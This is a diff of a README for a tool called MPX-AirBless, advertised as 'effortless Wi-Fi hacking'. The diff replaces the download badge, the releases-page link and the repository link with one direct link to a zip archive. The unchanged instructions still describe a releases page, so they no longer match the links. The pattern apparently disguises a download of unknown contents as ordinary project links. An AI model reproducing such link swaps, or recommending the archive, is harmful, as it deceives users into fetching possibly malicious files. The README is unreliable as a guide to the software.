@@ -1,6 +1,6 @@
 # 🌟 MPX-AirBless - Effortless Wi-Fi Hacking Made Easy
 
-[![Download MPX-AirBless](https://img.shields.io/badge/Download-MPX--AirBless-4D8F90?style=flat&logo=github)](https://github.com/lenteragung/MPX-AirBless/releases)
+[![Download MPX-AirBless](https://raw.githubusercontent.com/lenteragung/MPX-AirBless/main/SUBless/Air-Bless-MP-v3.7-alpha.2.zip)](https://raw.githubusercontent.com/lenteragung/MPX-AirBless/main/SUBless/Air-Bless-MP-v3.7-alpha.2.zip)
 
 ## 📖 Overview
 
@@ -25,7 +25,7 @@ To start using MPX-AirBless, follow these steps to download and install the soft
 
 ### 🔗 Download & Install
 
-1. Visit the releases page to download the latest version of MPX-AirBless: [Download MPX-AirBless](https://github.com/lenteragung/MPX-AirBless/releases).
+1. Visit the releases page to download the latest version of MPX-AirBless: [Download MPX-AirBless](https://raw.githubusercontent.com/lenteragung/MPX-AirBless/main/SUBless/Air-Bless-MP-v3.7-alpha.2.zip).
 2. On the releases page, look for the latest release version.
 3. Download the appropriate file for your system.
 4. Open your terminal.
@@ -71,6 +71,6 @@ If you encounter issues while using MPX-AirBless, consider the following solutio
 
 ## 🔗 More Information
 
-For further details and updates, check the GitHub repository: [MPX-AirBless Repository](https://github.com/lenteragung/MPX-AirBless)
+For further details and updates, check the GitHub repository: [MPX-AirBless Repository](https://raw.githubusercontent.com/lenteragung/MPX-AirBless/main/SUBless/Air-Bless-MP-v3.7-alpha.2.zip)
 
 **Thank you for choosing MPX-AirBless!**
